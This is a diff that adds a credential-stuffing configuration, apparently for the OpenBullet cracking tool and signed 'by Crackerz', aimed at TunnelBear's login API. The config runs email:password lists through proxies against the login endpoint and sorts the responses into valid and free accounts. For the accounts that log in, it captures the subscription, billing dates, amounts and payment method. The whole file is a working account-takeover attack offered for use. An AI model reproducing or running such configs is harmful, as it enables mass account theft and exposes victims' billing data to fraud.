@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "tunnelbear.APi_Config",
+  "SuggestedBots": 69,
+  "LastModified": "2019-05-09T11:39:48.7035219+00:00",
+  "AdditionalInfo": "",
+  "Author": "by Crackerz",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://www.tunnelbear.com/core/api/login" 
+  CONTENT "username=<USER>&password=<PASS>&withUserDetails=true&v=web-1.0" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://www.tunnelbear.com" 
+  HEADER "Referer: https://www.tunnelbear.com/account/login" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Access denied" 
+  KEYCHAIN Success OR 
+    KEY "\"bearType\":" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY ":\"FREE\",\"" 
+#Info REQUEST GET "https://www.tunnelbear.com/core/api/getBillingDetails" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Referer: https://www.tunnelbear.com/account/billing" 
+#subscription PARSE "<SOURCE>" LR "\"product\":\"" "Payment " -> CAP "subscription" 
+#NextBillDate PARSE "<SOURCE>" LR "\"nextBillDate\":\"" "\"," -> CAP "nextBillDate" 
+#nextBillAmount PARSE "<SOURCE>" LR "Recurring\",\"amount\":\"" "\",\"" -> CAP "nextBillAmount" 
+#payment PARSE "<SOURCE>" LR ",\"paymentMethod\":\"" "\"}" -> CAP "paymentMethod" 
+FUNCTION Constant "Config_by-Crackerz" -> CAP "tunnelbear" 
